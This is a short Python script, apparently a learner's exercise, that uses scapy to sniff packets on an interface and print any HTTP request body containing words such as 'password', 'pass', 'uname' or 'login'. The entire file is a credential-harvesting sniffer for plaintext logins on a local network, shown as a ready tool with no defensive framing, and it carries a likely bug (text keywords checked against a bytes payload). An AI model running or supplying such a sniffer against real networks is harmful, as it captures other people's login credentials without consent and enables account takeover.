#! /usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


def snif(interface):
    scapy.sniff(iface=interface, store=False, prn=packet_sniff_details)

test = []
dict_test = {}
def packet_sniff_details(qais):
    if qais.haslayer(http.HTTPRequest):
        if qais.haslayer(scapy.Raw):
            load = qais[scapy.Raw].load
            #print(packet.show())
            key_words = ["uname", "password", "pass", "login"]
            for word in key_words:
                if word in load:
                    print(load)
                    break
                        

    # if packet.haslayer(http.HTTPRequest):
    #     url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    #     print(packet.show())
    #     print(url)


snif("eth0")


